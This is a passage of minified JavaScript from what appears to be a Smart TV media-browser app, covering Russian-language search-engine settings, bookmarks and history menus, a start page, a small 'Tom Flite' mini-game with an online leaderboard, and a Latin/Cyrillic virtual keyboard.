setVars("start",se);data.defaultSelect=oldselect;se=se.search}else se=getVars("start").search;data["chan"+"nels"]=[];data.before="<div style='text-align:left;margin:3px 20px;'><b>Поисковая система по умолчанию </b><div style='text-align:left;font-size: 18px;'> Список формируется из вашей истории посещений сайтов с поисковыми формами и добавленных вручную</div></div>";data.align="left";var cX=0,cY=0;try{var typ="sites";for(var i=0;i<se[typ].length;i++){var mn=[{"title":"Использовать по умолчанию","playlist_url":"about:configsearch#setDop:sites:"+i+":2"},{"title":"Использовать дополнительно","playlist_url":"about:configsearch#setDop:sites:"+i+":1"},{"title":"Отключить ","playlist_url":"about:configsearch#setDop:sites:"+i+":0"},{"title":"Изменить","playlist_url":"about:configsearch#edit:"+typ+":"+i},{"title":"Передвинуть вверх","playlist_url":"about:configsearch#move:"+typ+":up:"+i},{"title":"Передвинуть вниз","playlist_url":"about:configsearch#move:"+typ+":down:"+i}];if(se[typ][i].dop==2)var dop="<span style='color:green;font-weight:bold;'>по умолчанию </span>";else if(se[typ][i].dop)dop="дополнительно";else{dop="<span style='color:red;'>отключено</span>"}
mn.push({"title":"Удалить","playlist_url":"about:configsearch#del"+typ+":"+i});data["chan"+"nels"].push({"logo_30x30":se[typ][i].logo,"position":"html","br":1,"title":se[typ][i].title,"playlist_url":"menu","menu":mn,"template":"<div style='text-align:left;margin:0px 30px;font-size:25px;float:left;width: 450px;   overflow: hidden;'><img src='$logo_30x30' onerror='this.style.visibility=\"hidden\";' style='height:20px;margin-top: 5px; margin-right: 5px;    float: left;' />"+"$title</div><div style='font-size:18px;margin-left:30px;float:left;width:150px;'>"+dop+"</div><div style='font-size:18px;margin-left:20px;float:left;width:60px;'>&nbsp;"+se[typ][i].type+"</div><div style='font-size:16px;color:#f2ebb6;margin-left:30px;float:left;    padding-top: 4px;    width: 450px;    overflow: hidden;    height: 20px;'>"+se[typ][i].url+"</div>","description":tmpl_info.replace("info",se[typ][i].url),"after":"<br>"})}
data["chan"+"nels"].push({"logo_30x30":"none","before":"<div style='margin: 50px;'>","title":"Добавить поисковик","position":"html","br":1,"template":tmpl_button,"playlist_url":"about:configsearch#edit:sites:new"});data["chan"+"nels"].push({"logo_30x30":"none","title":"Сбросить настройки поисковых систем","position":"html","br":0,"playlist_url":"confirm","confirm":["about:configsearch#setdefault"],"after":"</div>","template":tmpl_button});data["chan"+"nels"][data["chan"+"nels"].length-1].after+="<div style='font-size:18px;margin:30px;font-style: italic;'><span style='color:green;'>По умолчанию </span> - Это ваша поисковая система по умолчанию в адресной строке и на начальной странице.<br>"+"Дополнительно - поиск будет вестись также по этим сайтам Iframe - сайт ищет по нескольким вложенным в нем страницам (ифреймах) Site - одна страница с ответом на ваш запрос</div>"}catch(e){kjtYpr.popUp("Err listed searches:<br>"+e.message,2000)}}else if(n.indexOf("about:addstartlink")==0){if(n=="about:addstartlinkok"){if(gV(pq.input,"sturl")=="")kjtYpr.inf("Ссылка не может быть пустой!",1800);else{if(gV(pq.input,"sttitle")=="")var title=gV(pq.input,"sturl").match(/(.*\/\/)?(.{0,20})(\?)?/)[2];else title=gV(pq.input,"sttitle");favarray={"title":title,"playlist_url":pq.input.sturl};kjtYpr.llI0IOruD0IOI1IYprPlay("cmdToStart");return gotoStart()}}
var data={"title":"Добавить ссылку","channels":[]};data.channels.push({"title":"Заголовок(не обязательно)"+(gV(pq.input,"sttitle")!=""?":"+gV(pq.input,"sttitle"):""),"value":gV(pq.input,"sttitle"),"playlist_url":"payd_sttitle","search_on":"Введите заголовок","logo_30x30":""});data.channels.push({"title":"URL ссылки"+(gV(pq.input,"sturl")!=""?":"+gV(pq.input,"sturl"):""),"value":gV(pq.input,"sturl"),"playlist_url":"payd_sturl","search_on":"Введите URL ссылки","logo_30x30":"","presearch":"http://omnibox.spiderxml.com/?type=all"});data.channels.push({"title":"Добавить","playlist_url":"about:addstartlinkok","logo_30x30":""});data.icon="none";data.typeList="list";data.navigate="Добавить новый сайт в Стартовое меню"}else if(n=="about:favorites"){s=maJor.read("bookmarks");var dopch=[];if(s!=""){var sd=l0OIIlIIlONuu1111Ypr(s);if(sd!=null){dopch=sd}}
var data={"playlist_name":"_FPZakladki_","channels":[]};for(var i=0;i<dopch.length;i++){if(typeof dopch[i].logo_30x30!="undefined")var logo=dopch[i].logo_30x30;else logo="https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png";data.channels.push({"title":dopch[i].title,"playlist_url":dopch[i].playlist_url,"logo_30x30":_img(logo)})}
data.channels.push({"title":"Добавить папку","playlist_url":"bookmarksadd","logo_30x30":""+_img("_ST_plus.png")});if(maJor.read("zakladki.xml")!="")data.channels.push({"title":maJor.params.get("zakladki.xml"),"playlist_url":"zakladki.xml","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});if(maJor.read("zakladkiSerials.xml")!="")data.channels.push({"title":maJor.params.get("zakladkiSerials.xml"),"playlist_url":"zakladkiSerials.xml","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});if(maJor.read("zakladkiFilms.xml")!="")data.channels.push({"title":maJor.params.get("zakladkiFilms.xml"),"playlist_url":"zakladkiFilms.xml","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});if(maJor.read("zakladkiIPTV.xml")!="")data.channels.push({"title":maJor.params.get("zakladkiIPTV.xml"),"playlist_url":"zakladkiIPTV.xml","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});data.channels.push({"title":"_FPMy_ _FPVneshnie_ _FPzakladki_ "+(!maJor.user?"(Необходимо войти в аккаунт)":"("+maJor.user.login)+")","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=list","logo_30x30":""+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/zakl.png")});data.channels.push({"logo_30x30":_img("_ST_history.png"),"title":"История поисков","playlist_url":"about:histsearch","description":""});data.channels.push({"logo_30x30":_img("_ST_history.png"),"title":"История вводов URL","playlist_url":"about:histurl","description":""});data.channels.push({"logo_30x30":_img("_ST_history.png"),"title":"_FPIstoriya_ ("+maJor.read("history").length+"bytes)","playlist_url":"about:history","description":"История последних просмотров и посещений на этом устройстве"});data.channels.push({"logo_30x30":_img("_ST_history.png"),"onclick":"autouserexport()","title":"История посещений моих устройств "+(!maJor.user?"(Необходимо войти в аккаунт)":"("+maJor.user.login)+")","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=history"});data.channels.push({"title":"Кеш / Сохраненные страницы ("+maJor.read("prev_cache").length+"bytes)","playlist_url":"about:cache","logo_30x30":_img("_ST_fcache.png"),"description":"В кеш сохраняются страницы открытые со стартового меню или внутренних/внешних закладок. Эти страницы хранятся локально на вашем устройстве"})}else if(n.indexOf("about:histsearch")==0){data={"playlist_name":"История поисков","channels":[]};for(var a in enteresObj){var el=enteresObj[a];if(!el.n.match(/[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi))
data.channels.push({"title":el.n,"playlist_url":"http://spiderxml.com/search?search="+el.n,"logo_30x30":_img("_ST_history.png"),"description":"Нажмите для поиска в Spider"})}}else if(n.indexOf("about:histurl")==0){data={"playlist_name":"История ввода адресов","channels":[]};var x=maJor.read("enteres").split("|");for(var a in enteresObj){var el=enteresObj[a];if(el.n.match(/[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi))
data.channels.push({"title":el.n,"playlist_url":el.n,"logo_30x30":_img("_ST_history.png"),"description":"Нажмите для перехода по адресу<br>"+el.n})}}else if(n.indexOf("about:cache")==0){data={"title":"Кеш","channels":[]};var x=l0OIIlIIlONuu1111Ypr(maJor.read("prev_cache"));if(n=="about:cache"){for(var a in x){var el=x[a];data.channels.push({"title":el.settitle,"playlist_url":"about:cache://"+a,"logo_30x30":el.setimg,"description":"Дата помещения в кеш: "+dt(el.setcache,!0)+"<br>Размер: "+ll1lI1lI0sl0OlIYpr(el).length+"bytes"})}}else{data=x[n.substr(14)]}}else if(n=="about:history"){s=maJor.read("history");data=l0OIIlIIlONuu1111Ypr(s);var d=[];if(data==null){d.push({"title":"_FPZdesPusto_"})}else for(var i=0;i<data.length;i++){var dpu=null;if(typeof data[i].ch=="object"){var ch=data[i].ch;ch.menu=[{"title":"Страница "+data[i].title,"playlist_url":data[i].xml_url,"logo_30x30":data[i].icon}];var mtc=data[i].ch.stream_url.match(/\/\/(.*?)\//);if(mtc!=null)dpu=mtc[1];ch.display_title=ch.title+" / "+data[i].title}else{ch={"display_title":data[i].title,"playlist_url":data[i].xml_url,"logo_30x30":data[i].icon}}
if(dpu==null){var mtc=data[i].xml_url.match(/\/\/(.*?)\//);if(mtc!=null)dpu=mtc[1]}
if(dpu!=null)dpu="<div style='float:right;margin-right: "+css_w(27)+"px;'>"+dpu+"</div>";else dpu="";ch.display_title=dt(data[i].time+(parseInt(maJor.params.get("JTVRegion"))+T.offset/60)*3600,1,0,1,1)+dpu+" <span style='white-space:normal;'>"+ch.display_title+"</span>";ch.title=data[i].title;ch.description="";d.push(ch)}
data={"options":"hidedescription","cacheinfo":"nocache","playlist_name":"_FPIstoriya_","channels":d}}
if(n=="getconfig"){var def={"config":{"best":3,"order":startL},"fav":[]};var ch=l0OIIlIIlONuu1111Ypr(maJor.read("glstart"));if(ch==null){ch=def}
if(typeof ch.config=="undefined"||ch.config==null)ch.config=def.config;if(typeof ch.config.order=="undefined")ch.config.order=def.config.order;if(typeof ch.fav=="undefined")ch.fav=def.fav;if(typeof ch.search=="undefined"){ch.search={"sites":[]};ch.search.sites.push({"logo":"http://fxmlparsers.in.net/icons/play.png","type":"site","title":"VideoCDN.tv","dop":1,"url":"http://fxmlparsers.in.net/http://videocdn.tv/?id=search&search=%s"});ch.search.sites.push({"logo":"http://p.lnka.ru/icons/youtube.png","type":"site","title":"YouTube","dop":2,"url":"http://p.lnka.ru/http://youtube.com/?id=search&search=%s"});ch.search.sites.push({"logo":"http://fxmlparsers.in.net/icons/kinogo.png","type":"site","title":"Kinogo.la","dop":1,"url":"http://fxmlparsers.in.net/http://kinogo.la/?id=search&search=%s"})}
if(typeof ch.search.system!="undefined"){for(var i=0;i<ch.search.system.length;i++){el=ch.search.system[i];if(el!=null){el.type="iframe";ch.search.sites.push(el)}}
delete ch.search.system}
if(typeof ch.search.ds!="undefined"&&typeof ch.search.sites[ch.search.ds]!="undefined"){ch.search.sites[ch.search.ds].dop=2;delete ch.search.ds}
for(var i=0;i<ch.search.sites.length;i++){if(ch.search.sites[i]==null){ch.search.sites.splice(i,1);i--}else if(typeof ch.search.sites[i].type=="undefined")ch.search.sites[i].type="site"}
return ch}
if(n=="start"||n=="about:blank"){var ch=getVars("getconfig");ch.service=[];if(maJor.build>=5.5)ch.service.push({"source":"service","title":"Local Files & Plugins","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"http://remotefo.rk/treeview?host=remotefo.rk/","description":"http://127.0.0.1/treeview"});else if(maJor.build>=5.1)ch.service.push({"source":"service","title":"Ace stream torrent plugins","logo_30x30":"_ST_ace_stream.png","playlist_url":"http://remotefo.rk/treeview?pluginacetorrentplay/.xml&host=remotefo.rk/","description":"forkplayer://pluginacetorrentplay/"});if(maJor.params.get("acestream")||maJor.params.get("aceactive"))ch.service.push({"source":"service","title":"Ace stream torrent","logo_30x30":"_ST_ace_stream.png","local":2,"mb_parser":"http://ACE_IP:6878/webui/api/service?method=get_version&format=jsonp&callback=mycallback","menu_url":"1080|remotefork|rfs","playlist_url":"http://p.lnka.ru/torrentsites/?as=md5mbhash","description":"http://p.lnka.ru/torrentsites/"});if(maJor.params.get("remote")>0){ch.service.push({"source":"service","title":"RemoteFork DLNA & Plugins","logo_30x30":"_ST_dlna.png","playlist_url":"forkdlna","description":"forkplayer://RemoteFork/"});ch.service.push({"source":"service","title":"Home media server","tvg-shift":"1","logo_30x30":"_ST_hms.png","playlist_url":"hms","description":"forkplayer://HMS/"})}
if(maJor.platform()=="tizen")ch.service.push({"source":"service","title":"USB","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});else if(maJor.platform()=="maple"){ch.service.push({"source":"service","title":"USB<br>_FPPamyatTv_","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});ch.service.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php","description":"http://forkplayer.tv/forkstore"})}
ch.service=delDupl(ch.fav,ch.service);if(typeof ch.hidetop=="object"){for(var i=0;i<ch.service.length;i++)if(ch.hidetop[gV(ch.service[i],"playlist_url")+""+gV(ch.service[i],"stream_url")]){ch.service.splice(i,1);i--}}
ch.omnibox=[];var k=getDefaultSE();if(!k.allse.length){var ot="_FPEnter_ URL _FPor Add search engine in settings_";var logo="none"}else if(k.allse.length==1){ot="_FPEnter URL or search on_ "+k.allse[0]+" _FPor Add search engine in settings_";logo=k.logo}else{logo="";ot="_FPEnter URL or search on_ "+k.allse.join(", ")+""}
ch.omnibox.push({"source":"spider","title":ot,"position":"fulleditline","value":"","search_on":"_FPEnter search query or URL_:","logo_30x30":logo,"playlist_url":"searchEngines","presearch":"http://omnibox.spiderxml.com/?type=all"});ch.spider=[];ch.spider.push({"source":"spider","title":"_FPAdd a search engine_","position":"html","template":tmpl_box2,"logo_30x30":_img("_ST_auto_fix.png"),"playlist_url":"about:configsearch#edit:sites:new"});ch.spider.push({"source":"spider","title":"_FPRecover my account data_","position":"html","logo_30x30":"_ST_search.png","playlist_url":"http://cloudflare.appfxml.com/browseraccount/","template":tmpl_box3});ch.spider.push({"source":"spider","title":"_FPMy bookmarks and history_","position":"html","logo_30x30":_img("_ST_1px.png"),"playlist_url":"about:favorites","template":tmpl_box3});ch.spider.push({"source":"spider","title":"_FPVisit third party site_ spiderxml","position":"html","logo_30x30":"_ST_search.png","playlist_url":"http://spiderxml.com/","template":tmpl_box3});ch.spider.push({"source":"spider","title":"_FPVideo site_ FXML PARSERS","position":"html","logo_30x30":"http://fxmlparsers.in.net/icons/movicon.png","playlist_url":"http://fxmlparsers.in.net/","template":tmpl_box2});ch.spider.push({"source":"spider","title":"_FPGo to settings_","position":"html","logo_30x30":_img("_ST_1px.png"),"playlist_url":"about:settings","template":tmpl_box3});ch.spider.push({"source":"spider","title":"_FPHide_ _FPBeginner_","position":"html","playlist_url":"confirm","description":"_FPHide from the start page hints_ _FPBeginner_? _FPYou can turn it back on in the settings_","confirm":["about:settings#setconfig:setsearch:0"],"template":tmpl_box3});ch.top=getTop(ch);ch.channels=[];$.each(ch.config.order,function(i,val){var kk=0;$.each(ch[val],function(i2,val2){if(val2!=null){val2.id=i2;if(i2==0){kk=0;val2.br=1;val2.before=gV(startT,val)}else{val2.br=0;kk++;val2.before=""}
if(kk==9){val2.br=1;kk=0}
val2.source=val;ch.channels.push(val2)}});kk=0;if(val=="fav"){val2={"source":"addfav","title":"<b>_FPAdd shortcut_</b>","logo_30x30":_img("_ST_round_plus.png"),"playlist_url":"about:addstartlink"};if(ch.fav.length==0){kk=0;val2.br=1;val2.before=gV(startT,val)}else kk++;if(kk==9){val2.br=1;kk=0}
ch.channels.push(val2)}});ch.title="_FPDobroPozhalovat_";ch.icon="none";ch.align="left";ch.typeList="start";ch.css="#content{width: 95%;margin-left: 5%;} .description{visibility:hidden;}";ch.navigate="_FPStartovoeMenu_";for(var i=0;i<ch.channels.length;i++){for(var j in ch.channels[i]){if(gV(ch[i],j)=="undefined")ch.channels[i][j]=""}}
data=ch}
return data}
function OeInit(f,n){var b=Inset.create();b.init(n);return b}
function getFon(u){if(u==-1)u="";else if(u=="")u=_img("_ST_fon/fon20.jpg");else if(u=="jpg"||u=="png"){u=maJor.addident("http://cloudflare.appfxml.com/browseraccount/?do=fon&ext="+u)}
return u}
var curPage=FXMLPage.create();function wheel(c){return IlO11lQ0().wheel(c)}
function capitalizeFirstLetter(string){return string.charAt(0).toUpperCase()+string.slice(1)}
function cleanCh(ch){var obj={};for(var key in ch){if(gV(ch,key)!==""&&key.toString().match(/^(title|logo|stream_url|playlist_url|search_on|parser|description|tvg-|group|catchup|search_on)/)){if(gP().is_iptv>2&&key=="description"){ch[key]=""}
if(ch[key]!==""){obj[key]=ch[key]}}}
return obj}
function reverseString(str){return str.toString().split("").reverse().join("")}
var hexDigits=new Array("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f");function hex(x){return isNaN(x)?"00":hexDigits[(x-x%16)/16]+hexDigits[x%16]}
function onImgError(t,m){t.onerror=null;if(m==null||m=="err"){t.src=icoerr}else if(m=="emptydoc"){t.src=_img("_ST_emptydoc.png")}else if(m=="ico_edit"){t.src=ico_edit}}
try{document.addEventListener('visibilitychange',function(){if(document.hidden){}else{uHelper.create("direct").updateCurl();maJor.Remote.init();maJor.updateWeather()}},!0);window.addEventListener("resize",function(event){})}catch(e){}
addHandler(window,'DOMMouseScroll',wheel);addHandler(window,'mousewheel',wheel,{passive:!1});var tomflight_init=!1;function tomflight(){tscreen="game";if(!tomflight_init){var div=document.createElement('div');div.id="game";div.style.top="0px";div.style.left="0px";div.style.width="1280px";div.style.height="720px";div.style.overflow="hidden";div.style.display="none";div.style.padding="0px";div.style.backgroundColor="black";div.style.position="absolute";div.style.zIndex="0";div.onclick=tomflight_click;$_("main").appendChild(div);tomflight_init=!0}
$_("game").style.display="block";$_("game").style.zIndex="1";$_("game","<div style='padding:0px 20px;height:30px;width:1240px;'><div id='gfps' style='position:absolute;left:200px;'></div><div id='gallrel' style='position:absolute;left:450px;'></div><div id='gtop' style='float:left;'></div><div id='gfirst' style='float:right;'></div></div>"+"<div id='gmain' style='height:690px;width:1280px;'></div>"+"<div id='gbottom'></div>");tomflight_start()}
var tomflight_f=!1,tomflight_i,tomflight_fi,tomflight_c,t_x=0,t_c=0,t_t=0,t_arr=[],t_xnum=0,t_rec=0,t_fps=0,fps=0,t_glrek="";var glevel=1,gwidth=16000,ltx=0,mv=0;function tomflight_start(){t_x=0;t_c=250;t_xnum=0;t_t=0;t_fps=0;fps=0;ltx=0;mv=0;glevel=1;var s=maJor.read("rt");if(s>0)t_rec=s;else t_rec=0;t_arr=[],tomflight_f=!1;clearInterval(tomflight_i);clearInterval(tomflight_fi);if(t_glrek!=""){var s=t_glrek.split("<br>");$_("gallrel",s[1]+":"+s[0].split(":")[1])}else{uHelper.create("directnoheader").hid().getI("http://185.158.114.122/obovse.ru/smarttv/api.php?do=tomflight&fps=0&n=0").parse=function(s){t_glrek=gV(s);s=t_glrek.split("<br>");$_("gallrel","WEEK "+s[2]+" "+s[1]+":"+s[0].split(":")[1])}}
$_("gfirst","Рекорд: "+t_rec);$_("gmain","<div id='gtowers' style=\"position:absolute;top:30px;left:"+t_x+"px;height:100%;width:"+gwidth+"px;background:url(https://raw.githubusercontent.com/komivp/appinfodl/main/static/tomflight/tomflight_fon.jpg);\"></div>"+"<div id='gcat' style='position:absolute;top:"+t_c+"px;left:150px;height:48px;width:64px;background-color:gray;background:url(https://raw.githubusercontent.com/komivp/appinfodl/main/static/tomflight/tom.png);'></div>");tomflight_tower(t_x);tomflight_i=setInterval("tomflight_render();",40);tomflight_fi=setInterval(function(){if(tomflight_f){clearInterval(tomflight_fi);return}
fps=(t_fps/2).toFixed(1);mv=-1*((t_x-ltx)/2).toFixed(1);t_fps=0;ltx=t_x;$_("gfps","FPS: "+fps)},2000)}
function tomflight_render(){if(tomflight_f||handler=="vk")return;var ind=1;if(fps>2&&t_x<-150&&mv>15){if(fps>2)ind=24/fps;else ind=24/3}
ind=ind+((glevel-1)/10)*ind;t_x-=Math.ceil(7*ind);t_t++;t_fps++;t_c+=Math.ceil(1+(t_t/3.5))*ind;if(t_x*-1>gwidth){tomflight_tower();glevel++;t_x=0;kjtYpr.popUp("Уровень: "+glevel)}
$_("gcat").style.top=t_c+"px";$_("gtowers").style.left=t_x+"px";tomflight_isset()}
function tomflight_down(){if(tomflight_f)return;t_c+=75;$_("gcat").style.backgroundPosition="0px 48px";$_("gcat").style.top=t_c+"px";setTimeout('$_("gcat").style.backgroundPosition="0px 0px";',120);tomflight_isset()}
function tomflight_click(m,k,n){if(tomflight_f)return;if(n==null){t_c-=55;$_("gcat").style.backgroundPosition="0px 96px";n=0;clearTimeout(tomflight_c)}else t_c-=10;t_t=0;$_("gcat").style.top=t_c+"px";if(n<2)tomflight_c=setTimeout("tomflight_click(null,null,"+(n+1)+");",30);else setTimeout('$_("gcat").style.backgroundPosition="0px 0px";',100);tomflight_isset()}
function tomflight_tower(x){var s="",i=2,l=0,ls=0,dm=120;t_arr=[];while(l+400<gwidth){var r=Math.ceil(80+340*Math.random());if(ls>0){if(ls-r>dm)r=ls-dm;else if(r-ls>dm)r=ls+dm}
var l=i*400;t_arr.push([l,r]);s+="<div style='position:absolute;top:0px;left:"+l+"px;height:"+r+"px;width:130px;background:url(https://raw.githubusercontent.com/komivp/appinfodl/main/static/tomflight/tomfligh_t_down.png);background-position:0px "+r+"px;'></div>"+"<div style='position:absolute;top:"+(r+150)+"px;left:"+l+"px;height:"+(690-r-150)+"px;width:130px;background:url(https://raw.githubusercontent.com/komivp/appinfodl/main/static/tomflight/tomfligh_t_up.png);'></div>";i++;ls=r}
$_("gtowers",s)}
var last=-1;function tomflight_isset(){var s="";var x=150-t_x;for(var i=0;i<t_arr.length;i++){if(x+62>t_arr[i][0]&&x<130+t_arr[i][0]){if(x>t_arr[i][0]+60){t_xnum=(glevel-1)*t_arr.length+i+1}
s=" INTO "+t_c+" "+t_arr[i][1];if(t_c-27<t_arr[i][1]||t_c>t_arr[i][1]+140){s=" INTO FAIL "+t_c+" "+t_arr[i][1];tomflight_fail()}}}
if(t_c>800&&!tomflight_f)tomflight_fail();if(last!=t_xnum)$_("gtop","Счет: "+t_xnum);last=t_xnum}
var tomflight_fail=function(){if(tomflight_f)return;tomflight_f=!0;clearInterval(tomflight_fi);clearInterval(tomflight_i);clearTimeout(tomflight_c);setTimeout(function(){if(t_xnum>0){uHelper.create("directnoheader").hid().getI("http://185.158.114.122/obovse.ru/smarttv/api.php?do=tomflight&fps="+fps+"&n="+t_xnum).parse=function(s){t_glrek=gV(s);s=t_glrek.split("<br>");$_("gallrel","WEEK "+s[2]+" "+s[1]+":"+s[0].split(":")[1]);if(s[3]=="new"){confirmed.close();VK.open({title:"_FPWeek record! Enter your nickname_",value:gV(maJor.user,"login"),oncomplete:function(c){if(c.str=='')return;maJor.write("tfn",c.str);uHelper.create("directnoheader").hid().get("http://185.158.114.122/obovse.ru/smarttv/api.php?do=tomflight&setname="+c.str+"&initial="+box_client+"|"+maJor.getId()+"|"+kjtYpr.hardware+"|"+kjtYpr.serial);confirmed.create("Новый рекорд!<br>Счет: "+t_xnum+"<br>","Tom Flite","_FPZakrit_|_FPNachatZanovo_");confirmed.fun0=function(){tscreen="main";$_("game").style.display="none";$_("game").style.zIndex="0"};confirmed.fun1=function(){tomflight_start()}}});$_("game").style.zIndex="0"}}}
if(t_xnum>t_rec){t_rec=t_xnum;maJor.write("rt",t_xnum);s="";confirmed.create("Новый рекорд!<br>Счет: "+t_xnum+"<br>","Tom Flite","_FPZakrit_|_FPNachatZanovo_")}else confirmed.create("Вы проиграли<br>Счет: "+t_xnum+"<br>Рекорд: "+t_rec,"Tom Flite","_FPZakrit_|_FPNachatZanovo_");confirmed.fun0=function(){tscreen="main";$_("game").style.display="none";$_("game").style.zIndex="0"};confirmed.fun1=function(){tomflight_start()}},1000)}
var VK={pos:[2,7],last:[0,0],last2:[0,0],shift:0,req_id:0,qSelect:-1,select:-1,quicks:[],hS:{},l0IlI0I10LMNlOI1IYpr:null,UrlSearch:null,focus:null,US:[[["1","!"],["2","="],["3","#"],["4","$"],["5","%"],["6","^"],["7","&"],["8","*"],["9","("],["0",")"],["http://staticdata.appinfo.su/staticfiles/fimg/copy.png"],["http://staticdata.appinfo.su/staticfiles/fimg/paste.png"],["http://staticdata.appinfo.su/staticfiles/fimg/clear.png"],["_ST_backspace.png"],["http://staticdata.appinfo.su/staticfiles/fimg/return.png"]],[["q","Q"],["w","W"],["e","E"],["r","R"],["t","T"],["y","Y"],["u","U"],["i","I"],["o","O"],["p","P"],["[","{"],["]","}"],["@","-"],[":","+"],["_ST_international.png"]],[["\\","|"],["a","A"],["s","S"],["d","D"],["f","F"],["g","G"],["h","H"],["j","J"],["k","K"],["l","L"],["_",";"],["'",'"'],["/","?"],["_ST_enter.png"]],[["+","#"],["z","Z"],["x","X"],["c","C"],["v","V"],["b","B"],["n","N"],["m","M"],[",","<"],[".",">"],["http://staticdata.appinfo.su/staticfiles/fimg/left.png"],["http://staticdata.appinfo.su/staticfiles/fimg/right.png"],["_ST_space.png"],["_ST_shift.png"]],],Kir:[[["1","!"],["2",'"'],["3","\u2116"],["4",";"],["5","%"],["6",":"],["7","?"],["8","*"],["9","("],["0",")"],["http://staticdata.appinfo.su/staticfiles/fimg/copy.png"],["http://staticdata.appinfo.su/staticfiles/fimg/paste.png"],["http://staticdata.appinfo.su/staticfiles/fimg/clear.png"],["_ST_backspace.png"],["http://staticdata.appinfo.su/staticfiles/fimg/return.png"]],[["\u0439","\u0419"],["\u0446","\u0426"],["\u0443","\u0423"],["\u043A","\u041A"],["\u0435","\u0415"],["\u043D","\u041D"],["\u0433","\u0413"],["\u0448","\u0428"],["\u0449","\u0429"],["\u0437","\u0417"],["\u0445","\u0425"],["\u044A","/"],["@","-"],[":","_"],["_ST_international.png"]],[["ф","Ф"],["\u044B","І"],["\u0432","\u0412"],["\u0430","\u0410"],["\u043F","\u041F"],["\u0440","\u0420"],["\u043E","\u041E"],["\u043B","\u041B"],["\u0434","\u0414"],["\u0436","\u0416"],["\u044D","є"],["і","ї"],["+","\u0401"],["_ST_enter.png"]],[["\u044F","\u042F"],["\u0447","\u0427"],["\u0441","\u0421"],["\u043C","\u041C"],["\u0438","\u0418"],["\u0442","\u0422"],["\u044C","\u042C"],["\u0431","\u0411"],["\u044E","\u042E"],[".",","],["http://staticdata.appinfo.su/staticfiles/fimg/left.png"],["http://staticdata.appinfo.su/staticfiles/fimg/right.png"],["_ST_space.png","_ST_space.png"],["_ST_shift.png"]],],handler:function(key){var c=this;switch(key){case VK_0:VK.enter(0);break;case VK_1:VK.enter(1);break;case VK_2:VK.enter(2);break;case VK_3:VK.enter(3);break;case VK_4:VK.enter(4);break;case VK_5:VK.enter(5);break;case VK_6:VK.enter(6);break;case VK_7:VK.enter(7);break;case VK_8:VK.enter(8);break;case VK_9:VK.enter(9);break;case VK_DOWN:if(VK.pos[0]==3||VK.qSelect>-1||maJor.params.get("keyboard")=="system"){if(c.quicks.length>0){VK.qSelect++;c.quickList();if(VK.qSelect==c.quicks.length-1&&VK.pos[0]==3)VK.pos[0]++}else VK.pos[0]++}else VK.pos[0]++;VK.setpos(1);break;case VK_UP:if(VK.pos[0]==0||VK.qSelect>-1||maJor.params.get("keyboard")=="system"){if(c.quicks.length>0){VK.qSelect--;c.quickList();if(VK.qSelect==-1&&VK.pos[0]==0)VK.pos[0]--}else VK.pos[0]--}else VK.pos[0]--;VK.setpos(1);break;case VK_LEFT:VK.pos[1]--;VK.setpos();break;case VK_RIGHT:VK.pos[1]++;VK.setpos();break;case VK_ENTER:if(VK.qSelect==-1)VK.enter(VK.l0IlI0I10LMNlOI1IYpr[VK.pos[0]][VK.pos[1]][VK.shift]);else{VK.enter("Enter");c.quickList(-1);VK.pos[0]=2;VK.pos[1]=13;VK.setpos()}
break;case VK_G:case VK_GREEN:case 35:VK.enter("_ST_international.png");break;case VK_BLUE:VK.enter("_ST_enter.png");break;case 46:case VK_YELLOW:c.clearQuick();break;case VK_RED:VK.enter("_ST_backspace.png");break;case VK_BACK:case 220:c.close();break;default:if((key>=65&&key<=90)||(key>=186&&key<=222)||key==32||key==8||key==46){var s="";if(key==46){VK.enter("_ST_backspace.png");return}
if(key==186)s=";";if(key==187)s="=";if(key==188)s=",";if(key==189)s="-";if(key==190)s=".";if(key==191)s="/";if(key==192)s="`";if(key==219)s="[";if(key==220)s="\\";if(key==221)s="]";if(key==222)s="'";if(VK.l0IlI0I10LMNlOI1IYpr[1][0][0]=="q"){if(s=="")s=String.fromCharCode(key).toLowerCase()}else{var from="qwertyuiop[]asdfghjkl;'zxcvbnm,./".split("");var dest="йцукенгшщзхъфывапролджэячсмитьбю.".split("");if(s=="")s=String.fromCharCode(key).toLowerCase();s=replaceArray(s,from,dest)}}
